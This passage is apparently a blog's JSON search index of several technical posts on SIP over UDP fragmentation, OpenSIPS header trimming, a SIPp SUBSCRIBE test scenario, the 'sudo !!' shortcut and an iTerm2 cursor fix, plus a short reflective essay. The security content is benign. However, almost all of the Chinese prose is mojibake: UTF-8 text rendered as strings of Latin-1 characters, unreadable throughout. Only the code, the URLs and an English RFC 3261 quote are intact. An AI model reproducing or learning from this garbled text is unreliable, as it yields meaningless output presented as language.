ä¸€é€—ç•™ã€‚\nåŠ¨è½¦çš„è½¦å¤´ä¸Šï¼Œä¸çŸ¥é“æ˜¯ç¢°åˆ°äº†ä»€ä¹ˆä¸œè¥¿ï¼ŒæŸ“äº†ä¸€å¤§ç‰‡é»„è‰²çš„æ±¡æ¸ï¼Œä»¿ä½›æ˜¯æ’åˆ°ä¸çŸ¥åçš„åŠ¨ç‰©è€Œç•™ä¸‹çš„ç—•è¿¹ã€‚è½¦ç¯å®›å¦‚ä¸€ä¸ªå¤§å·çš„ä¸‰è§’çœ¼ï¼Œç›´å‹¾å‹¾çš„å¾€å‰æœ›ç€ï¼Œä¸çŸ¥é“åœ¨å†æƒ³äº›ä»€ä¹ˆã€‚\nçªç„¶æˆ‘çš„è„‘å­é‡Œè¿¸å°„å‡ºä¸€ä¸ªé—®é¢˜: äººä¸ºä»€ä¹ˆæ´»ç€ï¼Ÿ\nè®°å¾—ä»¥å‰è¯¾æœ¬ä¸Šè¯´ï¼Œäººå’ŒåŠ¨ç‰©çš„åŒºåˆ«æ˜¯äººä¼šä½¿ç”¨å·¥å…·ã€‚ä½†æ˜¯æˆ‘æƒ³åœ¨è§‰å¾—ï¼Œäººå’ŒåŠ¨ç‰©çš„åŒºåˆ«åº”è¯¥æ˜¯ï¼Œäººä¼šé—®è‡ªå·±: æˆ‘ä»€ä¹ˆæ´»ç€ã€‚è€ŒåŠ¨ç‰©å‡­æœ¬èƒ½è¡ŒåŠ¨ï¼Œä¼¼ä¹å¹¶ä¸ä¼šè€ƒè™‘æ´»ç€è¿™ä¹ˆæ·±å¥¥çš„é—®é¢˜ã€‚\nä¸€åªèš‚èšåœ¨ä¸€æ ¹ç»³çˆ¬ï¼Œåªæœ‰ä¸¤ä¸ªæ–¹å‘ï¼Œè¦ä¹ˆå‰è¿›ï¼Œè¦ä¹ˆåé€€ã€‚æœ‰ä¸ªèš‚èšä¼¼ä¹å‘ç°äº†ç¬¬ä¸‰ä¸ªæ–¹å‘ï¼Œå°±æ˜¯å¯ä»¥ç»•ç€ç»³å­è½¬åœˆåœˆã€‚è€Œä¼šè½¬åœˆåœˆçš„èš‚èšï¼Œä¼¼ä¹å°±æ˜¯é‚£ä¸ªå®¹æ˜“çƒ¦æ¼çš„èš‚èšã€‚\nè¿™æ˜¯æˆ‘ç¬¬ä¸€æ¬¡è€ƒè™‘äººä¸ºä»€ä¹ˆæ´»ç€è¿™ä¸ªé—®é¢˜ã€‚å›é¦–è¿‡å»ï¼Œæˆ‘è§‰å¾—è‡ªå·±æ˜¯ä¸ªåŠ¨ç‰©ï¼Œå‡­å€Ÿæœ¬èƒ½ç”Ÿæ´»ï¼Œé¥¿äº†å°±åƒï¼Œç´¯äº†å°±ç¡ã€‚\næ„Ÿè§‰æ¯ä¸€å¤©éƒ½æ˜¯ä¸€ä¸ªå‘¨æœŸå‡½æ•°ï¼Œæ°¸ä¸åœæ­¢çš„é‡å¤ä¸Šä¸‹æ³¢åŠ¨ã€‚\næœ€è¿‘åˆšå¥½å¯¹å£°çº¹è¯†åˆ«æœ‰äº›å…´è¶£ï¼Œåœ¨è¿™ä¸ªé¢†åŸŸï¼Œæœ‰ä¸ªæŠ€æœ¯å«åšå‚…é‡Œå¶å˜æ¢ã€‚å°±æ˜¯æŠŠä¸€ä¸ªæ—¶åŸŸçš„ä¿¡å·è½¬æ¢æˆé¢‘åŸŸçš„ä¿¡å·ã€‚å®é™…çš„ç‰©ç†ä½œç”¨å¹¶æ²¡æœ‰å˜åŒ–ï¼Œåªæ˜¯çœ‹å¾…äº‹ç‰©çš„è§’åº¦å‘ç”Ÿå˜åŒ–ï¼Œè€Œçœ‹åˆ°çš„ä¸œè¥¿å´ä¸ä¸€æ ·äº†ã€‚\næˆ‘è§‰å¾—æˆ‘ä¹Ÿéœ€è¦å¯¹æˆ‘çš„ç”Ÿæ´»åšä¸ªå‚…é‡Œå¶å˜æ¢ï¼Œæ‰¾åˆ°ä¸€äº›èƒ½è§£å†³æˆ‘å›°æƒ‘çš„ç­”æ¡ˆã€‚","title":"äººä¸ºä»€ä¹ˆæ´»ç€"},{"content":" ç°è±¡ æœ‰äº†å¼€æºçš„æ¡†æ¶ï¼Œæˆ‘ä»¬å¯ä»¥å¾ˆæ–¹ä¾¿çš„è¿è¡Œä¸€ä¸ªVOIPç³»ç»Ÿã€‚ä½†æ˜¯ç»´æŠ¤ä¸€ä¸ªVOIPç³»ç»Ÿå¹¶éé‚£ä¹ˆç®€å•ã€‚ç‰¹åˆ«æ˜¯å¦‚æœç»å¸¸å‡ºç°ä¸€äº›å¶å‘çš„é—®é¢˜ï¼Œéœ€è¦ç”¨ç»éªŒä¸°å¯Œçš„è¿ç»´äººå‘˜æ¥ä»ä¸åŒå±‚é¢åˆ†æã€‚\nå…¶ä¸­UDPåˆ†ç‰‡ï¼Œä¹Ÿå¯èƒ½æ˜¯åŸå› ä¹‹ä¸€ã€‚\nç®€ä»‹ ä»¥å¤ªç½‘çš„æœ€å¤§MTUä¸€èˆ¬æ˜¯1500å­—èŠ‚ï¼Œå‡å»20å­—èŠ‚çš„IPé¦–éƒ¨ï¼Œ8å­—èŠ‚çš„UDPé¦–éƒ¨ï¼ŒUDPèƒ½æ‰¿è½½çš„æ•°æ®æœ€å¤§æ˜¯1472å­—èŠ‚ã€‚\nå¦‚æœä¸€ä¸ªSIPæ¶ˆæ¯çš„æŠ¥æ–‡è¶…è¿‡1472å°±ä¼šåˆ†ç‰‡ã€‚ï¼ˆå®é™…ä¸Šï¼Œå¦‚æœç½‘ç»œçš„MTUæ¯”1500æ›´å°ï¼Œé‚£ä¹ˆè¾¾åˆ°åˆ†ç‰‡çš„å°ºå¯¸ä¹Ÿä¼šå˜å°ï¼‰\nå¦‚ä¸‹å›¾ï¼Œå‘é€æ–¹é€šè¿‡ä»¥å¤ªç½‘å‘é€äº†4ä¸ªæŠ¥æ–‡ï¼ŒABCDã€‚å…¶ä¸­DæŠ¥æ–‡å¤ªäº†ï¼Œè€Œè¢«åˆ†å‰²æˆäº†ä¸‰ä¸ªæŠ¥æ–‡ã€‚åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­ï¼ŒDçš„ä¸€ä¸ªåˆ†ç‰‡ä¸¢å¤±ï¼Œæ¥æ”¶æ–¹ç”±äºæ— æ³•é‡æ–°ç»„è£…DæŠ¥æ–‡ï¼Œæ‰€ä»¥å°±å°†DæŠ¥æ–‡çš„æ‰€æœ‰åˆ†ç‰‡éƒ½ä¸¢å¼ƒã€‚\nè¿™å°†ä¼šå¯¼è‡´ä¸€ä¸‹é—®é¢˜\nå‘é€æ–¹å› æ¥æ”¶ä¸åˆ°å“åº”ï¼Œæ‰€ä»¥äº§ç”Ÿäº†é‡ä¼  ä¸¢å¼ƒçš„åˆ†ç‰‡å¯¼è‡´å…¶ä»–çš„åˆ†ç‰‡æµªè´¹äº†å¸¦å®½ IPåˆ†ç‰‡æ˜¯å¯¹å‘é€è€…æ¥è¯´æ˜¯ç®€å•çš„ï¼Œä½†æ˜¯å¯¹äºæ¥æ”¶è€…æ¥è¯´ï¼Œåˆ†ç‰‡çš„ç»„è£…å°†ä¼šå ç”¨æ›´å¤šçš„èµ„æº RFC 3261ä¸­ç»™å‡ºå»ºè®®ï¼ŒæŸäº›æƒ…å†µä¸‹å¯ä»¥ä½¿ç”¨TCPæ¥ä¼ è¾“ã€‚\nå½“MTUæ˜¯æœªçŸ¥çš„æƒ…å†µä¸‹ï¼Œå¦‚æœæ¶ˆæ¯è¶…è¿‡1300å­—èŠ‚ï¼Œåˆ™é€‰æ‹©ä½¿ç”¨TCPä¼ è¾“ å½“MTUæ˜¯å·²çŸ¥æƒ…å†µä¸‹ï¼ŒSIPçš„æ¶ˆæ¯çš„å¤§å°å¦‚æœå¤§äºMTU-200, åˆ™éœ€è¦ä½¿ç”¨TCPä¼ è¾“ã€‚ç•™ä¸‹200å­—èŠ‚çš„ä½™é‡ï¼Œæ˜¯å› ä¸ºSIPæ¶ˆæ¯çš„å“åº”å¯èƒ½å¤§äºSIPæ¶ˆæ¯çš„è¯·æ±‚ï¼Œä¸ºäº†é¿å…å“åº”æ¶ˆæ¯è¶…è¿‡MTUï¼Œæ‰€ä»¥è¦ç•™ä¸‹200å­—èŠ‚çš„ä½™é‡ã€‚ If a request is within 200 bytes of the path MTU, or if it is larger than 1300 bytes and the path MTU is unknown, the request MUST be sent\nusing an RFC 2914 [43] congestion controlled transport protocol, such\nas TCP. If this causes a change in the transport protocol from the\none indicated in the top Via, the value in the top Via MUST be\nchanged. This prevents fragmentation of messages over UDP and\nprovides congestion control for larger messages. However,\nimplementations MUST be able to handle messages up to the maximum\ndatagram packet size. For UDP, this size is 65,535 bytes, including\nIP and UDP headers.\nThe 200 byte \u0026ldquo;buffer\u0026rdquo; between the message size and the MTU\naccommodates the fact that the response in SIP can be larger than\nthe request. This happens due to the addition of Record-Route\nheader field values to the responses to INVITE, for example. With\nthe extra buffer, the response can be about 170 bytes larger than\nthe request, and still not be fragmented on IPv4 (about 30 bytes is consumed by IP/UDP, assuming no IPSec). 1300 is chosen when\npath MTU is not known, based on the assumption of a 1500 byte\nEthernet MTU. RFC 3261 18.1.1\nä½†æ˜¯ä½¿ç”¨TCPæ¥ä¼ è¾“ä¹Ÿæœ‰ç¼ºç‚¹ï¼Œå°±æ˜¯æ¯”ä½¿ç”¨UDPæ›´å ç”¨èµ„æºã€‚\nå¦‚ä½•å‘ç°é—®é¢˜ ç”¨tcpdumpåœ¨è·¯å¾„ä¸­æŠ“åŒ…ï¼Œç„¶åä½¿ç”¨wiresharkåˆ†ææŠ“åŒ…æ–‡ä»¶çš„å¤§å°åˆ†å¸ƒã€‚\nå¦‚ä½•å‡å°‘åŒ…çš„å°ºå¯¸ ç§»é™¤æ— ç”¨çš„SIPå¤´æˆ–è€…æ— ç”¨çš„SDPä¿¡æ¯, ä»¥opensipsè„šæœ¬ä¸ºä¾‹å­ # å¯ä»¥é€šè¿‡$mlæ¥è·å–æ¶ˆæ¯çš„é•¿åº¦ if ($ml \u0026gt; 1300) { xlog(\u0026#34;L_WARN\u0026#34;,\u0026#34;$ci $rm $si $fu: message big then 1300: $ml\u0026#34;); } if ($ml \u0026gt;= 1500) { xlog(\u0026#34;L_ERR\u0026#34;,\u0026#34;$ci $rm $si $fu: message to big than 1500 $ml\u0026#34;); sl_send_reply(\u0026#34;513\u0026#34;,\u0026#34;Message too big\u0026#34;); } # å¯ä»¥é€šè¿‡remove_hfå’Œcodec_deleteæ¥ç§»é™¤å¤šä½™çš„æ¶ˆæ¯ if(is_present_hf(\u0026#34;User-Agent\u0026#34;)) { remove_hf(\u0026#34;User-Agent\u0026#34;); } if (codec_exists(\u0026#34;Speex\u0026#34;)) { codec_delete(\u0026#34;Speex\u0026#34;); } ä½¿ç”¨SIPå¤´å‹ç¼©æŠ€æœ¯ï¼Œopensipsä¸­ä¹Ÿæœ‰å¤´å‹ç¼©çš„æ¨¡å— æ³¨æ„ä¸è¦åœ¨è„šæœ¬ä¸­éšæ„ä½¿ç”¨append_hfå»ç»™SIPæ¶ˆæ¯å¢åŠ å¤´ å‚è€ƒ https://www.yay.com/faq/voip-network/udp-maximum-mtu-size/ https://www.ibm.com/support/pages/sending-large-sip-request-exceeds-mtu-value-might-not-switch-udp-tcp http://www.rfcreader.com/#rfc3261_line6474 https://www.ecg.co/blog/125-sip-and-fragments-together-forever https://en.wikipedia.org/wiki/IP_fragmentation https://thomas.gelf.net/blog/archives/Smaller-SIP-packets-to-avoid-fragmentation,27.html http://www.evaristesys.com/blog/sip-udp-fragmentation-and-kamailio-the-sip-header-diet/ ","permalink":"https://wdd.js.org/opensips/ch7/big-udp-msg/","summary":"ç°è±¡ æœ‰äº†å¼€æºçš„æ¡†æ¶ï¼Œæˆ‘ä»¬å¯ä»¥å¾ˆæ–¹ä¾¿çš„è¿è¡Œä¸€ä¸ªVOIPç³»ç»Ÿã€‚ä½†æ˜¯ç»´æŠ¤ä¸€ä¸ªVOIPç³»ç»Ÿå¹¶éé‚£ä¹ˆç®€å•ã€‚ç‰¹åˆ«æ˜¯å¦‚æœç»å¸¸å‡ºç°ä¸€äº›å¶å‘çš„é—®é¢˜ï¼Œéœ€è¦ç”¨ç»éªŒä¸°å¯Œçš„è¿ç»´äººå‘˜æ¥ä»ä¸åŒå±‚é¢åˆ†æã€‚\nå…¶ä¸­UDPåˆ†ç‰‡ï¼Œä¹Ÿå¯èƒ½æ˜¯åŸå› ä¹‹ä¸€ã€‚\nç®€ä»‹ ä»¥å¤ªç½‘çš„æœ€å¤§MTUä¸€èˆ¬æ˜¯1500å­—èŠ‚ï¼Œå‡å»20å­—èŠ‚çš„IPé¦–éƒ¨ï¼Œ8å­—èŠ‚çš„UDPé¦–éƒ¨ï¼ŒUDPèƒ½æ‰¿è½½çš„æ•°æ®æœ€å¤§æ˜¯1472å­—èŠ‚ã€‚\nå¦‚æœä¸€ä¸ªSIPæ¶ˆæ¯çš„æŠ¥æ–‡è¶…è¿‡1472å°±ä¼šåˆ†ç‰‡ã€‚ï¼ˆå®é™…ä¸Šï¼Œå¦‚æœç½‘ç»œçš„MTUæ¯”1500æ›´å°ï¼Œé‚£ä¹ˆè¾¾åˆ°åˆ†ç‰‡çš„å°ºå¯¸ä¹Ÿä¼šå˜å°ï¼‰\nå¦‚ä¸‹å›¾ï¼Œå‘é€æ–¹é€šè¿‡ä»¥å¤ªç½‘å‘é€äº†4ä¸ªæŠ¥æ–‡ï¼ŒABCDã€‚å…¶ä¸­DæŠ¥æ–‡å¤ªäº†ï¼Œè€Œè¢«åˆ†å‰²æˆäº†ä¸‰ä¸ªæŠ¥æ–‡ã€‚åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­ï¼ŒDçš„ä¸€ä¸ªåˆ†ç‰‡ä¸¢å¤±ï¼Œæ¥æ”¶æ–¹ç”±äºæ— æ³•é‡æ–°ç»„è£…DæŠ¥æ–‡ï¼Œæ‰€ä»¥å°±å°†DæŠ¥æ–‡çš„æ‰€æœ‰åˆ†ç‰‡éƒ½ä¸¢å¼ƒã€‚\nè¿™å°†ä¼šå¯¼è‡´ä¸€ä¸‹é—®é¢˜\nå‘é€æ–¹å› æ¥æ”¶ä¸åˆ°å“åº”ï¼Œæ‰€ä»¥äº§ç”Ÿäº†é‡ä¼  ä¸¢å¼ƒçš„åˆ†ç‰‡å¯¼è‡´å…¶ä»–çš„åˆ†ç‰‡æµªè´¹äº†å¸¦å®½ IPåˆ†ç‰‡æ˜¯å¯¹å‘é€è€…æ¥è¯´æ˜¯ç®€å•çš„ï¼Œä½†æ˜¯å¯¹äºæ¥æ”¶è€…æ¥è¯´ï¼Œåˆ†ç‰‡çš„ç»„è£…å°†ä¼šå ç”¨æ›´å¤šçš„èµ„æº RFC 3261ä¸­ç»™å‡ºå»ºè®®ï¼ŒæŸäº›æƒ…å†µä¸‹å¯ä»¥ä½¿ç”¨TCPæ¥ä¼ è¾“ã€‚\nå½“MTUæ˜¯æœªçŸ¥çš„æƒ…å†µä¸‹ï¼Œå¦‚æœæ¶ˆæ¯è¶…è¿‡1300å­—èŠ‚ï¼Œåˆ™é€‰æ‹©ä½¿ç”¨TCPä¼ è¾“ å½“MTUæ˜¯å·²çŸ¥æƒ…å†µä¸‹ï¼ŒSIPçš„æ¶ˆæ¯çš„å¤§å°å¦‚æœå¤§äºMTU-200, åˆ™éœ€è¦ä½¿ç”¨TCPä¼ è¾“ã€‚ç•™ä¸‹200å­—èŠ‚çš„ä½™é‡ï¼Œæ˜¯å› ä¸ºSIPæ¶ˆæ¯çš„å“åº”å¯èƒ½å¤§äºSIPæ¶ˆæ¯çš„è¯·æ±‚ï¼Œä¸ºäº†é¿å…å“åº”æ¶ˆæ¯è¶…è¿‡MTUï¼Œæ‰€ä»¥è¦ç•™ä¸‹200å­—èŠ‚çš„ä½™é‡ã€‚ If a request is within 200 bytes of the path MTU, or if it is larger than 1300 bytes and the path MTU is unknown, the request MUST be sent\nusing an RFC 2914 [43] congestion controlled transport protocol, such\nas TCP. If this causes a change in the transport protocol from the","title":"UDPåˆ†ç‰‡å¯¼è‡´SIPæ¶ˆæ¯ä¸¢å¤±"},{"content":"åœ¨ubuntuä¸Šæ‰§è¡Œå‘½ä»¤ï¼Œç»å¸¸ä¼šå‡ºç°ä¸‹é¢çš„æŠ¥é”™ï¼š\ntcpdump: eno1: You don\u0026#39;t have permission to capture on that device (socket: Operation not permitted) è¿™ç§æŠ¥é”™ä¸€èˆ¬æ˜¯æ‰§è¡Œå‘½ä»¤æ—¶ï¼Œæ²¡æœ‰åŠ ä¸Šsudo\nå¿«é€Ÿçš„è§£å†³æ–¹æ¡ˆæ˜¯ï¼š\næŒ‰å‘ä¸Šç®­å¤´é”® ctrl+a è´¯æ ‡å®šä½åˆ°è¡Œé¦– è¾“å…¥sudo æŒ‰å›è½¦ ä¸Šé¢çš„æ­¥éª¤æ˜¯æ¯”è¾ƒå¿«çš„è¡¥æ•‘æ–¹æ¡ˆï¼Œä½†æ˜¯å› ä¸ºå‘ä¸Šçš„ç®­å¤´ä¸€èˆ¬å¸ƒå±€åœ¨é”®ç›˜çš„å³ä¸‹è§’ï¼Œä¸ç§»åŠ¨æ‰‹æŒå°±å¤Ÿä¸ç€ã€‚ä¸€èˆ¬è¾“å…¥å‘ä¸Šçš„ç®­å¤´æ—¶ï¼Œå³æ‰‹ä¼šç¦»å¼€é”®ç›˜çš„æœ¬ä½ï¼Œä¼šä½å¤´çœ‹ä¸‹é”®ç›˜ï¼Œæ‰¾ä¸‹å‘ä¸Šçš„ç®­å¤´çš„ä½ç½®ã€‚\næœ‰æ²¡æœ‰å³æ‰‹ä¸ç¦»å¼€é”®ç›˜æœ¬ä½ï¼Œä¸éœ€è¦ä½å¤´çœ‹é”®ç›˜çš„è§£å†³æ–¹æ¡ˆå‘¢ï¼Ÿ\nç­”æ¡ˆå°±æ˜¯ï¼š sudo !!Â !!ä¼šè¢«è§£é‡Šæˆä¸ºä¸Šä¸€æ¡æ‰§è¡Œçš„å‘½ä»¤ã€‚sudo !!å°±ä¼šå˜æˆä½¿ç”¨sudoæ‰§è¡Œä¸Šä¸€æ¡å‘½ä»¤ã€‚\nå¿«è¯•è¯•çœ‹å§ sudo bang bang\n","permalink":"https://wdd.js.org/posts/2021/04/nqs50g/","summary":"åœ¨ubuntuä¸Šæ‰§è¡Œå‘½ä»¤ï¼Œç»å¸¸ä¼šå‡ºç°ä¸‹é¢çš„æŠ¥é”™ï¼š\ntcpdump: eno1: You don\u0026#39;t have permission to capture on that device (socket: Operation not permitted) è¿™ç§æŠ¥é”™ä¸€èˆ¬æ˜¯æ‰§è¡Œå‘½ä»¤æ—¶ï¼Œæ²¡æœ‰åŠ ä¸Šsudo\nå¿«é€Ÿçš„è§£å†³æ–¹æ¡ˆæ˜¯ï¼š\næŒ‰å‘ä¸Šç®­å¤´é”® ctrl+a è´¯æ ‡å®šä½åˆ°è¡Œé¦– è¾“å…¥sudo æŒ‰å›è½¦ ä¸Šé¢çš„æ­¥éª¤æ˜¯æ¯”è¾ƒå¿«çš„è¡¥æ•‘æ–¹æ¡ˆï¼Œä½†æ˜¯å› ä¸ºå‘ä¸Šçš„ç®­å¤´ä¸€èˆ¬å¸ƒå±€åœ¨é”®ç›˜çš„å³ä¸‹è§’ï¼Œä¸ç§»åŠ¨æ‰‹æŒå°±å¤Ÿä¸ç€ã€‚ä¸€èˆ¬è¾“å…¥å‘ä¸Šçš„ç®­å¤´æ—¶ï¼Œå³æ‰‹ä¼šç¦»å¼€é”®ç›˜çš„æœ¬ä½ï¼Œä¼šä½å¤´çœ‹ä¸‹é”®ç›˜ï¼Œæ‰¾ä¸‹å‘ä¸Šçš„ç®­å¤´çš„ä½ç½®ã€‚\næœ‰æ²¡æœ‰å³æ‰‹ä¸ç¦»å¼€é”®ç›˜æœ¬ä½ï¼Œä¸éœ€è¦ä½å¤´çœ‹é”®ç›˜çš„è§£å†³æ–¹æ¡ˆå‘¢ï¼Ÿ\nç­”æ¡ˆå°±æ˜¯ï¼š sudo !!Â !!ä¼šè¢«è§£é‡Šæˆä¸ºä¸Šä¸€æ¡æ‰§è¡Œçš„å‘½ä»¤ã€‚sudo !!å°±ä¼šå˜æˆä½¿ç”¨sudoæ‰§è¡Œä¸Šä¸€æ¡å‘½ä»¤ã€‚\nå¿«è¯•è¯•çœ‹å§ sudo bang bang","title":"sudo !!çš„å¦™ç”¨"},{"content":"æ—¶åºå›¾ åœºæ™¯è§£é‡Š step1: SUBSCRIBE å®¢æˆ·ç«¯æƒ³è¦è®¢é˜…æŸä¸ªåˆ†æœºçš„çŠ¶æ€ step2: 200 Ok æœåŠ¡ç«¯æ¥å—äº†è¿™ä¸ªè®¢é˜…æ¶ˆæ¯ step3: NOTIFY æœåŠ¡ç«¯å‘å®¢æˆ·ç«¯è¿”å›ä»–çš„è®¢é˜…ç›®æ ‡çš„çŠ¶æ€ step4: 200 Ok å®¢æˆ·ç«¯è¿”å›è¡¨ç¤ºæ¥å— åœºæ™¯æ–‡ä»¶ \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;iso-8859-2\u0026#34; ?\u0026gt; \u0026lt;!DOCTYPE scenario SYSTEM \u0026#34;sipp.dtd\u0026#34;\u0026gt; \u0026lt;scenario name=\u0026#34;subscibe wait notify\u0026#34;\u0026gt; \u0026lt;send retrans=\u0026#34;500\u0026#34;\u0026gt; \u0026lt;![CDATA[ SUBSCRIBE sip:[my_monitor]@[my_domain] SIP/2.0 Via: SIP/2.0/[transport] [local_ip]:[local_port];branch=[branch] From: sipp \u0026lt;sip:[my_ext]@[my_domain]\u0026gt;;tag=[call_number] To: \u0026lt;sip:[my_monitor]@[my_domain]:[remote_port]\u0026gt; Call-ID: [call_id] CSeq: [cseq] SUBSCRIBE Contact: sip:[my_ext]@[local_ip]:[local_port] Max-Forwards: 10 Event: dialog Expires: 120 User-Agent: SIPp/Win32 Accept: application/dialog-info+xml, multipart/related, application/rlmi+xml Content-Length: 0 ]]\u0026gt; \u0026lt;/send\u0026gt; \u0026lt;recv response=\u0026#34;200\u0026#34; rtd=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;/recv\u0026gt; \u0026lt;recv request=\u0026#34;NOTIFY\u0026#34; crlf=\u0026#34;true\u0026#34; rrs=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;/recv\u0026gt; \u0026lt;send\u0026gt; \u0026lt;![CDATA[ SIP/2.0 200 OK [last_Via:] [last_From:] [last_To:] [last_Call-ID:] [last_CSeq:] Content-Length: 0 ]]\u0026gt; \u0026lt;/send\u0026gt; \u0026lt;!-- \u0026lt;nop\u0026gt; \u0026lt;action\u0026gt; \u0026lt;exec int_cmd=\u0026#34;stop_now\u0026#34;/\u0026gt; \u0026lt;/action\u0026gt; \u0026lt;/nop\u0026gt; --\u0026gt; \u0026lt;!-- definition of the response time repartition table (unit is ms) --\u0026gt; \u0026lt;ResponseTimeRepartition value=\u0026#34;10, 20, 30, 40, 50, 100, 150, 200\u0026#34;/\u0026gt; \u0026lt;!-- definition of the call length repartition table (unit is ms) --\u0026gt; \u0026lt;CallLengthRepartition value=\u0026#34;10, 50, 100, 500, 1000, 5000, 10000\u0026#34;/\u0026gt; \u0026lt;/scenario\u0026gt; å®šä¹‰é…ç½®æ–‡ä»¶ #!/bin/bash # conf.sh edge_address=\u0026#39;192.168.40.88:18627\u0026#39; my_ext=\u0026#39;8003\u0026#39; my_domain=\u0026#39;ss.cc\u0026#39; my_monitor=\u0026#39;8004\u0026#39; å®šä¹‰çŠ¶æ€ç å¤„ç†å‡½æ•° ç”¨æ¥å¤„ç†æ¥è‡ªsippçš„è¿”å›çš„çŠ¶æ€ç \n#!/bin/bash # util.sh log_error () { case $1 in 0) echo INFO: test success ;; 1) echo ERROR: At least one call failed ;; 97) echo ERROR: Exit on internal command. Calls may have been processed ;; 99) echo ERROR: Normal exit without calls processed ;; -1) echo ERROR: Fatal error ;; -2) echo ERROR: Fatal error binding a socket ;; *) echo ERROR: Unknow exit code $0 ;; esac } å¯åŠ¨æ–‡ä»¶ -keyÂ ç”¨æ¥å®šä¹‰å˜é‡ï¼Œåœ¨åœºæ™¯æ–‡ä»¶ä¸­å­˜åœ¨ä¸‰ä¸ªå˜é‡ [my_ext] å½“å‰åˆ†æœºå· [my_domain] å½“å‰åˆ†æœºåŸŸå [my_monitor] å½“å‰åˆ†æœºæƒ³è¦ç›‘æ§çš„åˆ†æœºå· -recv_timeoutÂ è¡¨ç¤ºè®¾ç½®æ¥å—æ¶ˆæ¯çš„è¶…æ—¶æ—¶é—´ä¸º1000æ¯«ç§’ -timeoutÂ è®¾ç½®æ•´ä¸ªè¿è¡Œè¿‡ç¨‹çš„è¶…æ—¶æ—¶é—´ -sf æŒ‡å®šåœºæ™¯æ–‡ä»¶ -mÂ è®¾ç½®æœ€å¤§å¤„ç†çš„å‘¼å«æ•° -lÂ è®¾ç½®å¹¶å‘å‘¼å«æ•°é‡ -rÂ è®¾ç½®å‘¼å«é€Ÿåº¦ #!/bin/bash # test.sh source ../util.sh source ./conf.sh rm *.log sipp -trace_logs $edge_address \\ -key my_ext $my_ext \\ -key my_domain $my_domain \\ -key my_monitor $my_monitor \\ -recv_timeout 1000 \\ -timeout 2 \\ -sf ./subscibe.xml -m 1 -l 1 -r 1; log_error $? æ‰§è¡Œæµ‹è¯•ï¼š chmod +x test.sh ./test.sh sngrep æŠ“åŒ… ","permalink":"https://wdd.js.org/opensips/tools/sipp-subscriber/","summary":"æ—¶åºå›¾ åœºæ™¯è§£é‡Š step1: SUBSCRIBE å®¢æˆ·ç«¯æƒ³è¦è®¢é˜…æŸä¸ªåˆ†æœºçš„çŠ¶æ€ step2: 200 Ok æœåŠ¡ç«¯æ¥å—äº†è¿™ä¸ªè®¢é˜…æ¶ˆæ¯ step3: NOTIFY æœåŠ¡ç«¯å‘å®¢æˆ·ç«¯è¿”å›ä»–çš„è®¢é˜…ç›®æ ‡çš„çŠ¶æ€ step4: 200 Ok å®¢æˆ·ç«¯è¿”å›è¡¨ç¤ºæ¥å— åœºæ™¯æ–‡ä»¶ \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;iso-8859-2\u0026#34; ?\u0026gt; \u0026lt;!DOCTYPE scenario SYSTEM \u0026#34;sipp.dtd\u0026#34;\u0026gt; \u0026lt;scenario name=\u0026#34;subscibe wait notify\u0026#34;\u0026gt; \u0026lt;send retrans=\u0026#34;500\u0026#34;\u0026gt; \u0026lt;![CDATA[ SUBSCRIBE sip:[my_monitor]@[my_domain] SIP/2.0 Via: SIP/2.0/[transport] [local_ip]:[local_port];branch=[branch] From: sipp \u0026lt;sip:[my_ext]@[my_domain]\u0026gt;;tag=[call_number] To: \u0026lt;sip:[my_monitor]@[my_domain]:[remote_port]\u0026gt; Call-ID: [call_id] CSeq: [cseq] SUBSCRIBE Contact: sip:[my_ext]@[local_ip]:[local_port] Max-Forwards: 10 Event: dialog Expires: 120 User-Agent: SIPp/Win32 Accept: application/dialog-info+xml, multipart/related, application/rlmi+xml Content-Length: 0 ]]\u0026gt; \u0026lt;/send\u0026gt; \u0026lt;recv response=\u0026#34;200\u0026#34; rtd=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;/recv\u0026gt; \u0026lt;recv request=\u0026#34;NOTIFY\u0026#34; crlf=\u0026#34;true\u0026#34; rrs=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;/recv\u0026gt; \u0026lt;send\u0026gt; \u0026lt;!","title":"subscribeåœºæ™¯æµ‹è¯•"},{"content":"ç»ˆç«¯ç”¨ç€ç”¨ç€ï¼Œå…‰æ ‡æ¶ˆå¤±äº†ã€‚\niterm2 ä»“åº“issuesç»™å‡ºæç¤ºï¼Œè¦åœ¨è®¾ç½®ã€‹é«˜çº§é‡Œé¢ï¼ŒUse system cursor icons when possile ä¸º yes.\nç„¶è€Œä¸Šé¢çš„è®¾ç½®å¹¶æ²¡æœ‰ç”¨ã€‚\nç„¶åçœ‹äº†superuserä¸Šçš„question, ç»™å‡ºæç¤º, ç›´æ¥åœ¨ç»ˆç«¯è¾“å…¥ resetÂ , å…‰æ ‡å°±ä¼šå‡ºç°ã€‚è§£å†³äº†é—®é¢˜ã€‚\nreset å‚è€ƒ https://gitlab.com/gnachman/iterm2/-/issues/6623 https://superuser.com/questions/177377/os-x-terminal-cursor-problem ","permalink":"https://wdd.js.org/posts/2021/04/hh661g/","summary":"ç»ˆç«¯ç”¨ç€ç”¨ç€ï¼Œå…‰æ ‡æ¶ˆå¤±äº†ã€‚\niterm2 ä»“åº“issuesç»™å‡ºæç¤ºï¼Œè¦åœ¨è®¾ç½®ã€‹é«˜çº§é‡Œé¢ï¼ŒUse system cursor icons when possile ä¸º yes.\nç„¶è€Œä¸Šé¢çš„è®¾ç½®å¹¶æ²¡æœ‰ç”¨ã€‚\nç„¶åçœ‹äº†superuserä¸Šçš„question, ç»™å‡ºæç¤º, ç›´æ¥åœ¨ç»ˆç«¯è¾“å…¥ resetÂ , å…‰æ ‡å°±ä¼šå‡ºç°ã€‚è§£å†³äº†é—®é¢˜ã€‚\nreset å‚è€ƒ https://gitlab.com/gnachman/iterm2/-/issues/6623 https://superuser.com/questions/177377/os-x-terminal-cursor-problem ","title":"iterm2 å…‰æ ‡æ¶ˆå¤±äº†"},{"content":"å­¦ä¹ matplotlibç»˜å›¾æ—¶ï¼Œä»£ç å¦‚ä¸‹ï¼Œæ‰§è¡Œè¿‡åï¼Œå›¾ç‰‡å¼¹çª—æ²¡æœ‰å¼¹å‡ºã€‚\nimport matplotlib.pyplot as plt import matplotlib 